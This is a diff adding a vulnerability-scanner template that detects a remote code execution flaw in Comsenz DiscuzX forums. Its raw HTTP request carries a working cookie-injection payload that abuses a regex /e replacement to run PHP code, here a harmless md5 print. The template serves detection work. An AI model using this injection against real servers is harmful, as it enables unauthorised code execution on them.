@@ -1,0 +1,30 @@
+id: comsenz-discuzx-rce-CT-158801
+
+info:
+  name: Comsenz DiscuzX RCE
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects a remote code execution vulnerability in Comsenz DiscuzX by injecting malicious payloads via cookies.
+
+variables:
+  rand: "{{rand_int(200000000, 210000000)}}"
+
+http:
+  - raw:
+      - |
+        GET /viewthread.php?tid=10 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Bsearcharray%5D=/.*/eui; GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Breplacearray%5D=print_r(md5({{rand}}));
+
+    redirects: false
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5(rand)}}"
+        part: body
